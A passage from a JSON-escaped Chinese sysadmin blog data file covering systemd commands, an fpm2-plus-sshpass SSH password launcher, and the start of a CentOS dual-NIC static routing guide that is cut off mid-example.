full.\\n~~~\\n\\n\u4ee5\u4e0a\u8fd9\u4e9b\u4fe1\u606f\u5411\u6211\u4eec\u5c55\u793a\u4e86\u670d\u52a1\u7684\u8fd0\u884c\u65f6\u95f4\uff0c\u5f53\u524d\u72b6\u6001\uff0c\u76f8\u5173\u8fdb\u7a0bpid\uff0c\u4ee5\u53ca\u6700\u8fd1\u7684\u6709\u5173\u8be5\u670d\u52a1\u7684\u65e5\u5fd7\u4fe1\u606f\uff0c\u662f\u4e0d\u662f\u5f88\u65b9\u4fbf\uff1f\\n\\n### 2 \u627e\u51fa\u6bcf\u9879\u670d\u52a1\u6240\u5bf9\u5e94\u7684\u8fdb\u7a0bid\\n\u5bf9\u4e8e\u7cfb\u7edf\u7ba1\u7406\u6765\u8bf4\u8fd9\u662f\u6700\u5e38\u89c1\u7684\u5de5\u4f5c\uff0c\u4f46\u662f\u5728sysvinit\u65f6\u4ee3\u6211\u4eec\u53ea\u80fd\u501f\u52a9\u4f8b\u5982ps\u547d\u4ee4\u7b49\u6765\u5b8c\u6210\uff0c\u800csystemd\u5df2\u7ecf\u8003\u8651\u5230\u4e86\u7cfb\u7edf\u7ba1\u7406\u5458\u7684\u9700\u6c42\uff0c\u4e8e\u662f\u4e0b\u9762\u7684\u547d\u4ee4\u8bde\u751f\u4e86\uff1a\\n\\n~~~bash\\n# systemd-cgls\\n\u251c\u25001 /usr/lib/systemd/systemd --switched-root --system --deserialize 22\\n\u251c\u2500user.slice\\n\u2502 \u251c\u2500user-1000.slice\\n\u2502 \u2502 \u251c\u2500session-1.scope\\n\u2502 \u2502 \u2502 \u251c\u25001806 gdm-session-worker [pam/gdm-password]\\n\u2502 \u2502 \u2502 \u251c\u25001820 /usr/bin/gnome-keyring-daemon --daemonize --login\\n\u2502 \u2502 \u2502 \u251c\u25001822 gnome-session\\n\u2502 \u2502 \u2502 \u251c\u25001830 dbus-launch --sh-syntax --exit-with-session\\n\u2502 \u2502 \u2502 \u251c\u25001831 /bin/dbus-daemon --fork --print-pid 4 --print-address 6 --session\\n\u2502 \u2502 \u2502 \u251c\u25001858 /usr/libexec/at-spi-bus-launcher\\n\u2502 \u2502 \u2502 \u251c\u25001862 /bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3\\n\u2502 \u2502 \u2502 \u251c\u25001865 /usr/libexec/at-spi2-registryd --use-gnome-session\\n\u2502 \u2502 \u2502 \u251c\u25001872 /usr/libexec/gvfsd\\n... ...\\n~~~\\n\\n\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u770b\u5230\u54ea\u9879\u670d\u52a1\u542f\u52a8\u4e86\u54ea\u4e9b\u8fdb\u7a0b\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u7ba1\u7406\u6765\u8bf4\u5341\u5206\u6709\u7528\uff1b\\n\\n### 3 \u5982\u4f55\u6b63\u786e\u7684\u6740\u6b7b\u670d\u52a1\u8fdb\u7a0b\\n\u5728sysvinit\u7684\u65f6\u4ee3\uff0c\u5982\u679c\u9700\u8981\u7ed3\u675f\u4e00\u4e2a\u670d\u52a1\u53ca\u5176\u542f\u52a8\u7684\u6240\u6709\u8fdb\u7a0b\uff0c\u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u4e9b\u7cdf\u7cd5\u7684\u8fdb\u7a0b\u65e0\u6cd5\u6b63\u786e\u7ed3\u675f\u6389\uff0c\u5373\u4fbf\u662f\u6211\u4eec\u4f7f\u7528kill\uff0ckillall\u7b49\u547d\u4ee4\u6765\u7ed3\u675f\u5b83\u4eec\uff0c\u5230\u4e86systemd\u7684\u65f6\u4ee3\u4e00\u5207\u90fd\u53d8\u5f97\u4e0d\u4e00\u6837\uff0csystemd\u53f7\u79f0\u662f\u7b2c\u4e00\u4e2a\u80fd\u6b63\u786e\u7684\u7ec8\u7ed3\u4e00\u9879\u670d\u52a1\u7684\u7a0b\u5e8f\uff0c\u4e0b\u9762\u6765\u770b\u770b\u5177\u4f53\u5982\u4f55\u64cd\u4f5c\u7684\uff1a\\n\\n`systemctl kill crond.service`\\n\\n\u6216\u8005\u6307\u5b9a\u4e00\u4e2a\u4fe1\u53f7\u53d1\u9001\u51fa\u53bb\\n\\n`systemctl kill -s SIGKILL crond.service`\\n\\n\u4f8b\u5982\u53ef\u4ee5\u50cf\u8fd9\u6837\u6267\u884c\u4e00\u6b21reload\u64cd\u4f5c\\n\\n`systemctl kill -s HUP --kill-who=main crond.service`\\n\\n### 4 \u5982\u4f55\u505c\u6b62\u548c\u7981\u7528\u4e00\u9879\u670d\u52a1\\n\u4e0b\u9762\u6211\u4eec\u56de\u987e\u4e00\u4e0b\u5728sysvinit\u65f6\u4ee3\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\u6240\u5b9e\u73b0\u7684\u529f\u80fd\\n```\\n# service ntpd stop\\n# chkconfig ntpd off\\n```\\n\\n\u5f88\u7b80\u5355\uff0c\u9996\u5148\u505c\u6b62\u670d\u52a1\uff0c\u5176\u6b21\u7981\u7528\u670d\u52a1\\n\u90a3\u4e48\u5728systemd\u4e2d\u5e94\u8be5\u5982\u4f55\u64cd\u4f5c\u5462\uff1f\\n```\\n# systemctl stop ntpd.service\\n# systemdctl disable ntpd.service\\n```\\n\u5f88\u663e\u7136systemctl\u547d\u4ee4\u5df2\u7ecf\u53d6\u4ee3\u4e86service \u548cchkconfig\u4e24\u4e2a\u547d\u4ee4\u7684\u4f4d\u7f6e\uff0c\u4e0d\u5149\u5982\u6b64\uff0c\u6211\u4eec\u8fd8\u80fd\u5c06\u670d\u52a1\u8bbe\u7f6e\u4e3a\u8fde\u4eba\u5de5\u4e5f\u65e0\u6cd5\u542f\u52a8\uff1a\\n```\\n# ln -s /dev/null  /etc/systemd/system/ntpd.service\\n# systemctl daemon-reload\\n```\\n\\n### 5 \u68c0\u67e5\u7cfb\u7edf\u542f\u52a8\u6d88\u8017\u65f6\u95f4\\n\u5728\u8fc7\u53bb\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u7b2c\u4e09\u65b9\u5de5\u5177\u6765\u5b9e\u73b0\u5bf9\u7cfb\u7edf\u542f\u52a8\u8fc7\u7a0b\u7684\u8017\u65f6\u8ddf\u8e2a\uff0c\u73b0\u5728\u8fd9\u4e2a\u529f\u80fd\u5df2\u7ecf\u96c6\u6210\u5230systemd\u5f53\u4e2d\uff0c\u53ef\u4ee5\u5341\u5206\u65b9\u4fbf\u7684\u4e86\u89e3\u5230\u7cfb\u7edf\u542f\u52a8\u65f6\u5728\u5404\u4e2a\u9636\u6bb5\u6240\u82b1\u8d39\u7684\u65f6\u95f4\uff1a\\n```bash\\n# systemd-analyze\\nStartup finished in 1.669s (kernel) + 1.514s (initrd) + 7.106s (userspace) = 10.290s\\n\u4ee5\u4e0a\u4fe1\u606f\u7b80\u8981\u7684\u5217\u51fa\u4e86\u4ece\u5185\u6838\u5230\u7528\u6237\u7a7a\u95f4\u6574\u4e2a\u5f15\u5bfc\u8fc7\u7a0b\u5927\u81f4\u82b1\u8d39\u7684\u65f6\u95f4\uff0c\u5982\u679c\u8981\u67e5\u770b\u5177\u4f53\u6bcf\u9879\u670d\u52a1\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u5219\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a\\n# systemd-analyze blame\\n          6.468s dnf-makecache.service\\n          5.556s network.service\\n          1.022s plymouth-start.service\\n           812ms plymouth-quit-wait.service\\n           542ms lvm2-pvscan@8:7.service\\n           451ms systemd-udev-settle.service\\n           306ms firewalld.service\\n           246ms dmraid-activation.service\\n           194ms lvm2-pvscan@8:18.service\\n           171ms lvm2-monitor.service\\n           145ms bluetooth.service\\n           135ms accounts-daemon.service\\n           113ms rtkit-daemon.service\\n           111ms ModemManager.service\\n           104ms avahi-daemon.service\\n           102ms systemd-logind.service\\n            79ms systemd-vconsole-setup.service\\n            77ms acpid.service\\n```\\n\\n\u8f93\u51fa\u7ed3\u679c\u7c7b\u4f3c\u4e0a\u9762\u8fd9\u4e9b\u5185\u5bb9\uff0c\u81f3\u6b64\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7cfb\u7edf\u91cc\u6bcf\u4e00\u9879\u670d\u52a1\u7684\u542f\u52a8\u65f6\u95f4\uff0c\u636e\u6b64\u53ef\u4ee5\u5bf9\u7cfb\u7edf\u5f15\u5bfc\u8fc7\u7a0b\u4e86\u5982\u6307\u638c\uff0c\u5982\u679c\u4f60\u89c9\u5f97\u8fd9\u8fd8\u4e0d\u591f\u76f4\u89c2\uff0c\u90a3\u4e48\u53ef\u4ee5\u5c06\u7ed3\u679c\u5bfc\u51fa\u5230\u56fe\u50cf\u6587\u4ef6\u91cc\u9762\uff1a\\n\\n`systemd-analyze plot >systemd.svg`\\n\\n\u8be5\u547d\u4ee4\u4f1a\u5c06\u7cfb\u7edf\u7684\u542f\u52a8\u8fc7\u7a0b\u8f93\u51fa\u5230\u4e00\u5f20svg\u56fe\u50cf\u4e0a\u9762\uff0c\u66f4\u76f4\u89c2\u7684\u5c55\u73b0\u51fa\u5404\u4e2a\u670d\u52a1\u542f\u52a8\u6240\u82b1\u8d39\u7684\u65f6\u95f4\uff0c\u5728\u6211\u4eec\u9700\u8981\u5206\u6790\u548c\u4f18\u5316\u670d\u52a1\u542f\u52a8\u9879\u7684\u65f6\u5019\u5f88\u6709\u5e2e\u52a9\u3002\\n\\n### 6 \u67e5\u770b\u5404\u9879\u670d\u52a1\u7684\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5\\n\u548ctop\u547d\u4ee4\u4e0d\u4e00\u6837\uff0ctop\u547d\u4ee4\u66f4\u4fa7\u91cd\u4e8e\u5c55\u793a\u4ee5\u8fdb\u7a0b\u4e3a\u5355\u4f4d\u7684\u8d44\u6e90\u72b6\u6001\uff0c\u800csystemd\u63d0\u4f9b\u4e86\u4e00\u4e2a\u547d\u4ee4\u6765\u65b9\u4fbf\u7684\u67e5\u770b\u6bcf\u9879\u670d\u52a1\u7684\u5b9e\u65f6\u8d44\u6e90\u6d88\u8017\u72b6\u6001\uff1a\\n~~~bash\\n# systemd-cgtop\\nPath                                              Tasks   %CPU   Memory  Input/s Output/s\\n/                                                   199   12.3     1.9G        -        -\\n/system.slice/ModemManager.service                    1      -        -        -        -\\n/system.slice/abrt-oops.service                       1      -        -        -        -\\n/system.slice/abrt-xorg.service                       1      -        -        -        -\\n/system.slice/abrtd.service                           1      -        -        -        -\\n/system.slice/accounts-daemon.service                 1      -        -        -        -\\n/system.slice/acpid.service                           1      -        -        -        -\\n/system.slice/alsa-state.service                      1      -        -        -        -\\n/system.slice/atd.service                             1      -        -        -        -\\n/system.slice/auditd.service                          3      -        -        -        -\\n/system.slice/avahi-daemon.service                    2      -        -        -        -\\n/system.slice/bluetooth.service                       1      -        -        -        -\\n/system.slice/chronyd.service                         1      -        -        -        -\\n/system.slice/colord.service                          1      -        -        -        -\\n/system.slice/crond.service                           1      -        -        -        -\\n~~~\\n\\n### 7 \u6211\u4eec\u5fc5\u987b\u8981\u6ce8\u610f\u5230\u7684\u914d\u7f6e\u6587\u4ef6\u53d8\u66f4\\nsystemd\u8003\u8651\u5230\u5404\u79cd\u53d1\u884c\u7248\u672c\u7684\u7528\u6237\u4f7f\u7528\u4e60\u60ef\uff0c\u5c3d\u91cf\u63d0\u4f9b\u66f4\u4e3a\u901a\u7528\u7684\u914d\u7f6e\u6587\u4ef6\u4ee5\u65b9\u4fbf\u5404\u5bb6\u7edf\u4e00\uff0c\u65b9\u4fbf\u7528\u6237\u4f7f\u7528\uff0c\u4e0b\u9762\u5217\u51fa\u4e00\u4e9b\u57fa\u672c\u7684\u7edf\u4e00\u7684\u914d\u7f6e\u6587\u4ef6\uff1a\\n* /etc/hostname\uff0cdebian\u548credhat\u5728\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u4e0a\u7684\u5dee\u5f02\u5bfc\u81f4\u4e86\u7cfb\u7edf\u7ba1\u7406\u6216\u591a\u6216\u5c11\u7684\u4e0d\u4fbf\uff0c\u6b64\u6587\u4ef6\u7684\u7edf\u4e00\u610f\u4e49\u91cd\u5927\\n* /etc/vconsole.conf\uff0c\u6b64\u6587\u4ef6\u7528\u6765\u7edf\u4e00\u7ba1\u7406console\u548c\u952e\u76d8\u6620\u5c04\\n* /etc/locale.conf \u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u8bed\u7cfb\\n* /etc/modules-load.d/*.conf \u5185\u6838\u6a21\u5757\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\\n* /etc/sysctl.d/*.conf \u5185\u6838\u53c2\u6570\u914d\u7f6e\u6587\u4ef6\uff0c\u5bf9/etc/sysctl.conf\u7684\u6269\u5145\\n* /etc/tmpfiles.d/*.conf \u8fd0\u884c\u6001\u4e34\u65f6\u6587\u4ef6\u914d\u7f6e\\n* /etc/os-release  /etc/machine-id  /etc/machine-info \u8fd9\u4e09\u4e2a\u6587\u4ef6\u7684\u7edf\u4e00\u5bf9\u7cfb\u7edf\u7ba1\u7406\u5458\u6765\u8bf4\u4e5f\u662f\u610f\u4e49\u6df1\u8fdc\uff0c\u5b83\u8ba9\u6211\u4eec\u6709\u4e86\u7edf\u4e00\u7684\u68c0\u6d4b\u53d1\u884c\u7248\u672c\u7b49\u4fe1\u606f\u7684\u5165\u53e3\\n\\n\u4ee5\u4e0a\u5185\u5bb9\u4ec5\u4ec5\u8ba9\u5404\u4f4d\u5bf9systemd\u5f62\u6210\u57fa\u672c\u7684\u8ba4\u8bc6\uff0c\u6211\u4eec\u5c06\u5728\u540e\u671f\u7684\u6587\u7ae0\u4e2d\u66f4\u52a0\u6df1\u5165\u5730\u8ba8\u8bbasystemd\u7684\u7279\u6027\u3002\u6700\u540e\uff0c\u518d\u6b21\u611f\u8c22\u4f5c\u8005Lennart\u7684\u8d21\u732e\u3002\\n\\n> \u53c2\u8003\u94fe\u63a5\uff1a\\n> * http://cgit.freedesktop.org/systemd/\\n> * http://0pointer.de/blog/projects/\\n> * https://linuxtoy.org/archives/interview-creater-of-systemd-and-pulseaudio-lennart.html"},{"id":"/2013/11/12/use-fpm2-to-manage-password","metadata":{"permalink":"/notes/blog/2013/11/12/use-fpm2-to-manage-password","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2013-11-12-use-fpm2-to-manage-password.md","source":"@site/blog/2013-11-12-use-fpm2-to-manage-password.md","title":"\u4f7f\u7528fpm2\u6765\u7ba1\u7406ssh\u5bc6\u7801","description":"","date":"2013-11-12T00:00:00.000Z","tags":[{"inline":true,"label":"fpm2","permalink":"/notes/blog/tags/fpm-2"}],"readingTime":2.77,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u4f7f\u7528fpm2\u6765\u7ba1\u7406ssh\u5bc6\u7801","description":"","categories":["shell","system"],"tags":["fpm2"]},"unlisted":false,"prevItem":{"title":"Systemd\u57fa\u672c\u4f7f\u7528\u4ecb\u7ecd","permalink":"/notes/blog/2014/04/08/systemd-basic-usage"},"nextItem":{"title":"CentOS\u4e2d\u53cc\u7f51\u5361\u9759\u6001\u8def\u7531\u914d\u7f6e","permalink":"/notes/blog/2013/11/11/centos-multi-network-interface-route"}},"content":"> \u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u7ae5\u978b\u9700\u8981\u7ba1\u7406\u4e00\u5806ssh\u53e3\u4ee4\uff0c5\u4e2a\u4ee5\u5185\u9760\u8111\u5b50\u8bb0\u53ef\u80fd\u662f\u4e2a\u597d\u529e\u6cd5\uff0c\u4f46\u662f\u5982\u679c10\u4e2a100\u4e2a\u7684\u65f6\u5019\u6050\u6015\u8111\u5b50\u8bb0\u6709\u70b9\u4e0d\u592a\u591f\u7528\u3002\\n\\n\\n\\n\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u7ae5\u978b\u9700\u8981\u7ba1\u7406\u4e00\u5806ssh\u53e3\u4ee4\uff0c5\u4e2a\u4ee5\u5185\u9760\u8111\u5b50\u8bb0\u53ef\u80fd\u662f\u4e2a\u597d\u529e\u6cd5\uff0c\u4f46\u662f\u5982\u679c10\u4e2a100\u4e2a\u7684\u65f6\u5019\u6050\u6015\u8111\u5b50\u8bb0\u6709\u70b9\u4e0d\u592a\u591f\u7528\uff0c\\n\u8fd9\u4e2a\u65f6\u5019\u5c31\u9700\u8981\u501f\u52a9\u5916\u90e8\u5de5\u5177\u6765\u8fdb\u884c\u7ba1\u7406\uff0c\u5f53\u7136\u4f60\u53ef\u4ee5\u81ea\u5df1\u5199\u4e2a\u7b80\u5355\u7684\u811a\u672c\uff0c\u628assh\u8d26\u53f7\u5bc6\u7801\u5199\u5165\u4e00\u4e2alist\u91cc\u9762\uff0c\\n\u4eba\u61d2\u4e14\u4e3a\u4e86\u7701\u4e8b\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u73b0\u6210\u7684\u5de5\u5177\uff0c\u4e0b\u9762\u5c31\u63a8\u8350\u4e00\u4e2a\u56fe\u5f62\u754c\u9762\u7684\u5c0f\u5de5\u5177\u7ed9\u9700\u8981\u7684\u7ae5\u978b\uff1afpm2\\nfpm2\u5168\u540dFigaro\'s Paaword Manager 2\uff0c\u662f\u4e00\u4e2a\u5f00\u6e90\u8f6f\u4ef6\uff0c\u4f7f\u7528GNU General Public License Version 2 \u534f\u8bae\uff0c\u8fd9\u91cc\u662f[\u5b98\u65b9\u5730\u5740](http://als.regnet.cz/fpm2/)\uff0c\u5b83\u8fd8\u6709android\u7248\u672c\u7684\u3002\\n\\n\u5728fedora\u91cc\u9762\u53ef\u4ee5\u76f4\u63a5yum\u5b89\u88c5\uff1a\\n\\n`yum install fpm2`\\n\\n\u5b89\u88c5\u5b8c\u6210\u540e\u7b2c\u4e00\u6b21\u8fd0\u884c\u9700\u8981\u4f60\u8f93\u5165\u4e00\u4e2a\u5bc6\u7801\uff0c\u4eca\u540e\u6bcf\u6b21\u542f\u52a8fpm2\u7684\u65f6\u5019\u5c31\u7528\u8fd9\u4e2a\u5bc6\u7801\uff0c\u9ed8\u8ba4\u5982\u679c\u5bc6\u7801\u8f93\u5165\u9519\u8bef\u6b21\u6570\u8d85\u8fc73\u6b21\uff0c\u5219\u4f60\u61c2\u7684\u3002\\n\\n\u6253\u5f00fpm2\u540e\uff0c\u4e00\u770b\u5c31\u660e\u767d\u5982\u4f55\u4f7f\u7528\uff0c\u5b83\u652f\u6301ssh/web\u4ee5\u53ca\u81ea\u5b9a\u4e49\u7684\u5bc6\u7801\u7ba1\u7406\uff0c\u53ef\u4ee5\u5bf9\u7ba1\u7406\u7684\u670d\u52a1\u5668\u8fdb\u884c\u5206\u7c7b\uff0c\u5341\u5206\u65b9\u4fbf\u3002\u5176\u4eae\u70b9\u662f\u4f60\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u9700\u8981\u8bbe\u7f6elauncher\uff0c\u9ed8\u8ba4\u53cc\u51fb\u5efa\u7acb\u597d\u7684\u53e3\u4ee4\u5c31\u4f1a\u81ea\u52a8\u6267\u884clauncher\u5b9a\u4e49\u7684\u547d\u4ee4\uff1b\\n\\nlauncher\u91cc\u9762\u5c06\u4fdd\u5b58\u7684\u8d26\u53f7\u5bc6\u7801\u548cIP/URL\u5b9a\u4e49\u4e3a\u53c2\u6570\uff0c`$a ip/url`  \uff0c`$u  username`  \uff0c `$p  password`\uff0c \u6709\u4e86\u8fd9\u4e9b\u53d8\u91cf\u540e\u81ea\u5b9a\u4e49launcher\u5c31\u5f88\u65b9\u4fbf\u4e86\u3002\\n\\n\u4f46\u662f\u5176\u9ed8\u8ba4\u7684ssh\u7684launcher\u662f\u4e0d\u652f\u6301\u76f4\u63a5\u53cc\u51fblist\u91cc\u9762\u7684\u9879\u76ee\u5c31\u767b\u9646\u8fdb\u670d\u52a1\u5668\u7684\uff0c\u8fd9\u4e2a\u65f6\u5019\u9700\u8981\u53e6\u5916\u4e00\u4e2a\u5c0f\u5de5\u5177sshpass\uff0c\u5b83\u7684\u7528\u5904\u662f\u767b\u9646ssh\u7684\u65f6\u5019\u53ef\u4ee5\u628a\u5bc6\u7801\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9ssh\u5ba2\u6237\u7aef\uff0c\u800c\u4e0d\u9700\u8981\u4ea4\u4e92\u5f0f\u8f93\u5165\u5bc6\u7801\uff0c\u8fd9\u4e2a\u5de5\u5177\u4ee3\u7801\u6258\u7ba1\u5728sf\uff0cfedora\u91cc\u4e5f\u53ef\u4ee5yum\u5b89\u88c5\uff1a\\n\\n`yum install sshpass`\\n\\n\u5149\u6709\u8fd9\u4e24\u4e2a\u5de5\u5177\u8fd8\u4e0d\u591f\uff0c\u4e0b\u9762\u662f\u5c06\u4e24\u4e2a\u5de5\u5177\u5b8c\u7f8e\u7ed3\u5408\u8d77\u6765\u7684\u5173\u952e\uff1a\\n\\n\u5728fpm2\u7684settings\u9009\u9879\u5361\u4e0b\u6709launcher\u8bbe\u7f6e\u9879\uff0c\u6253\u5f00\u4e4b\u540e\u4f60\u4f1a\u53d1\u73b0\u9ed8\u8ba4\u7684ssh launcher\uff0c\u4e0b\u9762\u662f\u6211\u81ea\u5b9a\u4e49\u7684ssh\u7684\u52a0\u8f7d\u5668\u547d\u4ee4\uff1a\\n\\n\u914d\u7f6elauncher\\n\\n`gnome-terminal -e \'sh -c \\"\'\\"sshpass -p \'\\"\'$p\'\\"\' ssh  -p 22 $u@$a;sudo -s\\"\'\\"\'`\\n\\n\u7279\u522b\u6ce8\u610f\u91cc\u9762\u7684\u5355\u53cc\u5f15\u53f7\u7684\u5199\u6cd5\uff0c\u4e0d\u7136\u5982\u679c\u4f60\u7684\u5bc6\u7801\u91cc\u6709\u50cf%&$\u4e4b\u7c7b\u7684\u7279\u6b8a\u7b26\u53f7\u65f6\u662f\u4f1a\u51fa\u95ee\u9898\u7684\uff0c\\n\\n`gnome-terminal -e \'xxxxx\'` \u8fd9\u91cc\u662f\u5355\u5f15\u53f7\\n\\n`sh -c \\"\'\\" xxxxx \\"\'\\"` \u8fd9\u91cc\u662f\u4e24\u5bf9\u53cc\u5f15\u53f7\u4e2d\u5305\u542b\u7684\u5355\u5f15\u53f7\\n\\n`sshpass -p \'\\"\' xxx \'\\"\'` \u8fd9\u91cc\u662f\u4e24\u5bf9\u5355\u5f15\u53f7\u5305\u542b\u7684\u53cc\u5f15\u53f7\\n\\nssh\u547d\u4ee4\u540e\u9762\u52a0\u4e2asudo -s\u7684\u4f5c\u7528\u662f\u5f53\u9000\u51fassh\u8fde\u63a5\u65f6\u4e0d\u4f1a\u7acb\u5373\u5173\u95ed\u5f53\u524d\u7684terminal\u7ec8\u7aef\\n\\n\u4f7f\u7528\u8fd9\u4e2alauncher\u53ef\u4ee5\u901a\u6740\u6240\u6709\u7279\u6b8a\u5b57\u7b26\u7684\u5bc6\u7801\uff0c\u5728\u8fd0\u884cfpm2+sshpass\u7684\u7ec4\u5408\u524d\u8bf7\u81ea\u5df1\u4f7f\u7528\u5f53\u524d\u8fd0\u884cfpm2\u7684\u8d26\u6237\u767b\u9646ssh\u4e00\u4e0b\u8fdc\u7a0b\u670d\u52a1\u5668\u5c06\u670d\u52a1\u5668\u7684publickey\u53d6\u56de\u6765\uff0c\u6ca1\u6709key\u7684\u60c5\u51b5\u4e0bsshpass\u65e0\u6cd5\u5de5\u4f5c\u7684\u3002\u81f3\u5c11\u6211\u9047\u5230\u7684\u662f\u8fd9\u6837\u3002"},{"id":"/2013/11/11/centos-multi-network-interface-route","metadata":{"permalink":"/notes/blog/2013/11/11/centos-multi-network-interface-route","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2013-11-11-centos-multi-network-interface-route.md","source":"@site/blog/2013-11-11-centos-multi-network-interface-route.md","title":"CentOS\u4e2d\u53cc\u7f51\u5361\u9759\u6001\u8def\u7531\u914d\u7f6e","description":"\u6f14\u793a\u5982\u4f55\u4e3a\u53cc\u7f51\u5361\u914d\u7f6e\u72ec\u7acb\u7684\u8def\u7531\u89c4\u5219","date":"2013-11-11T00:00:00.000Z","tags":[{"inline":true,"label":"centos","permalink":"/notes/blog/tags/centos"},{"inline":true,"label":"route","permalink":"/notes/blog/tags/route"}],"readingTime":2.46,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"CentOS\u4e2d\u53cc\u7f51\u5361\u9759\u6001\u8def\u7531\u914d\u7f6e","description":"\u6f14\u793a\u5982\u4f55\u4e3a\u53cc\u7f51\u5361\u914d\u7f6e\u72ec\u7acb\u7684\u8def\u7531\u89c4\u5219","categories":["system"],"tags":["centos","route"]},"unlisted":false,"prevItem":{"title":"\u4f7f\u7528fpm2\u6765\u7ba1\u7406ssh\u5bc6\u7801","permalink":"/notes/blog/2013/11/12/use-fpm2-to-manage-password"},"nextItem":{"title":"libvirt\u4e2d\u7684\u7f51\u7edc\u7ba1\u7406\u5b9e\u8df5","permalink":"/notes/blog/2013/10/01/libvirt-basic-usage"}},"content":">  \u4e00\u4e2a\u7f51\u5361\u7684\u8bdd\u4e0d\u9700\u8981\u9759\u6001\u8def\u7531\u7684\uff0c\u5982\u679c\u591a\u4e2a\u7f51\u5361\u7684\u8bdd\u53ef\u4ee5\u624b\u5de5\u914d\u7f6e\u9759\u6001\u8def\u7531\uff0c\u7279\u522b\u662f\u591a\u4e2a\u7f51\u5361\u8d70\u4e0d\u540c\u7684\u5b50\u7f51\u7684\u65f6\u5019\u3002\\n\\n\\n## \u6765\u81ea\u7f51\u4e0a\u641c\u7d22\u7684\u65b9\u6cd5\\n\u4e4b\u524d\u4e00\u76f4\u6ca1\u6709\u914d\u7f6e\u8fc7\u4e24\u4e2a\u7f51\u5361\u5206\u522b\u4f7f\u7528\u4e0d\u540c\u7684IP\uff0c\u8d70\u4e0d\u540c\u7684\u7f51\u5173\uff0cgoogle\u4e86\u4e0b\u53d1\u73b0\u4e86\u4e0b\u9762\u7684\u624b\u5de5\u6dfb\u52a0\u8def\u7531\u7684\u811a\u672c\uff1a\\n\\n~~~bash\\n#!/bin/sh\\nip route add 10.1.1.0/24 dev br0 src 10.1.1.10 table bond0\\nip route add default via 10.1.1.1 dev br0 table bond0\\nip rule add from 10.1.1.10/32 table bond0\\nip rule add to 10.1.1.10/32 table bond0\\n\\nip route add 192.168.1.0/24 dev br1 src 192.168.1.10 table bond1\\nip route add default via 192.168.1.1 dev br1 table bond1\\nip rule add from 192.168.1.10/32 table bond1\\nip rule add to 192.168.1.10/32 table bond1\\n~~~\\n\\n## \u6765\u81ea\u7ea2\u5e3d\u6587\u6863\u4e2d\u7684\u65b9\u6cd5\\n\u540e\u6765\u60f3\u4e86\u60f3\u8fd9\u6837\u7684\u95ee\u9898\u7cfb\u7edf\u80af\u5b9a\u5df2\u7ecf\u652f\u6301\u5f97\u5f88\u597d\u4e86\uff0c\u53ea\u662f\u6ca1\u6709\u627e\u5230\u914d\u7f6e\u65b9\u6cd5\uff0c\u4e8e\u662f\u627e\u4e86\u4e0b\u7ea2\u5e3d\u7684\u6587\u6863\uff0c\u53d1\u73b0\u53ef\u4ee5\u50cf\u4e0b\u9762\u8fd9\u6837\u914d\u7f6e\uff1a\\n\\n### \u914d\u7f6e\u9759\u6001\u8def\u7531\\n\\n \u4e00\u4e2a\u7f51\u5361\u7684\u8bdd\u4e0d\u9700\u8981\u9759\u6001\u8def\u7531\u7684\uff0c\u5982\u679c\u591a\u4e2a\u7f51\u5361\u7684\u8bdd\u53ef\u4ee5\u624b\u5de5\u914d\u7f6e\u9759\u6001\u8def\u7531\uff0c\u7279\u522b\u662f\u591a\u4e2a\u7f51\u5361\u8d70\u4e0d\u540c\u7684\u5b50\u7f51\u7684\u65f6\u5019\u3002\\n\\n`route -n   #\u67e5\u770b\u5f53\u524d\u8def\u7531\u4fe1\u606f`\\n\\n\u9759\u6001\u8def\u7531\u914d\u7f6e\u6587\u4ef6\u8def\u5f84:\\n`/etc/sysconfig/network-scripts/route-interface_name`\\n\u5c31\u548c\u7f51\u5361\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u7ed3\u6784\u5dee\u4e0d\u591a\uff0c\u6bd4\u5982ifcfg-eth0\u53d8\u6210\u4e86route-eth0\u3002\\n\\neth0\u7f51\u5361\u7684\u9759\u6001\u8def\u7531\u5c31\u4fdd\u5b58\u5728\u8fd9\u4e2a\u6587\u4ef6\u91cc\u9762\u3002\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u6709\u4e24\u79cd\u683c\u5f0f\\n- IP\u547d\u4ee4\u53c2\u6570\u683c\u5f0f\\n- \u7f51\u7edc/\u63a9\u7801\u6307\u4ee4\u683c\u5f0f\\n\\n#### IP\u547d\u4ee4\u53c2\u6570\u6a21\u5f0f\uff1a\\n\\n1\uff09\u7b2c\u4e00\u884c\u5b9a\u4e49\u9ed8\u8ba4\u8def\u7531\uff1a\\n```\\ndefault via X.X.X.X dev interface\\n```\\nX.X.X.X \u662f\u9ed8\u8ba4\u8def\u7531\u7684IP. interface\u662f\u53ef\u4ee5\u8fde\u63a5\u5230\u9ed8\u8ba4\u8def\u7531\u7684\u7f51\u5361\u63a5\u53e3\u540d.\\n\\n2\uff09\u9759\u6001\u8def\u7531\u4e00\u884c\u4e00\u4e2a\uff1a\\n```\\nX.X.X.X/X via X.X.X.X dev interface\\n```\\nX.X.X.X/X \u662f\u7f51\u7edc\u548c\u63a9\u7801. X.X.X.X \u548c interface \u662f\u5404\u81ea\u7f51\u6bb5\u7684\u7f51\u5173IP\u548c\u7f51\u5361\u63a5\u53e3.\\n\\n\u914d\u7f6e\u793a\u4f8b 